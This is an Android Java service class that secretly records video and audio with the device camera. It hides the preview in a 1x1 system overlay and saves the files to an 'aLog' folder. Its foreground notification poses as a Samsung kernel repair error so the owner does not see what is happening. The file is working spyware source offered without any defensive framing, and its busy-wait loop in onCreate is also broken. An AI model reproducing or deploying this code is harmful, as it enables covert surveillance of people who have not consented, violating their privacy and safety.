package mdane.myapplication6.Services;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.text.format.DateFormat;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import java.util.Date;

import mdane.myapplication6.R;

/**
 * Created by ashi on 10/24/14.
 */
public class BackgroundVideoRecorder extends Service implements SurfaceHolder.Callback {

    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private Camera camera = null;
    private MediaRecorder mediaRecorder = null;
public static boolean isRunning=false;

    @Override
    public void onCreate() {
        isRunning=true;
        running();
        // Start foreground service to avoid unexpected kill
        Notification notification = new Notification.Builder(this)
                .setContentTitle("Non-Fatal Error:x787x")
                .setContentText("Attempting repair on com.samsung.kernel")
                .setSmallIcon(R.drawable.ttt)
                .build();
        startForeground(1234, notification);

        // Create new SurfaceView, set its size to 1x1, move it to the top left corner and set this service as a callback
        windowManager = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
        surfaceView = new SurfaceView(this);
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                1, 1,
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
        );
        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
        windowManager.addView(surfaceView, layoutParams);
        surfaceView.getHolder().addCallback(this);

    }
public void running(){
while(isRunning) {
    getRunning();
    if (!isRunning) {
        stopSelf();
    }
}
}

public boolean getRunning(){
return isRunning;}

    // Method called right after Surface created (initializing and starting MediaRecorder)
    @Override
    public void surfaceCreated(SurfaceHolder surfaceHolder) {

        camera = Camera.open();
        mediaRecorder = new MediaRecorder();
        camera.unlock();

        mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
        mediaRecorder.setCamera(camera);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_720P));

        String state = Environment.getExternalStorageState();
        String name = DateFormat.format("yyyy-MM-dd_kk-mm-ss", new Date().getTime()) + ".mp4";
        String path;

        if (Environment.MEDIA_MOUNTED.equals(state)) {
            path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES) + "/aLog/" + name;
        } else {
            path = getFilesDir().getAbsolutePath() + "/aLog/" + name;
        }

        Log.d("info", "path: " + path);
        mediaRecorder.setOutputFile(path);
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch (Exception e) {
        }


    }

    // Stop recording and remove SurfaceView
    @Override
    public void onDestroy() {
isRunning=false;
        //  mediaRecorder.stop();
        mediaRecorder.reset();
        mediaRecorder.release();

        camera.lock();
        camera.release();

        windowManager.removeView(surfaceView);

    }

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

}
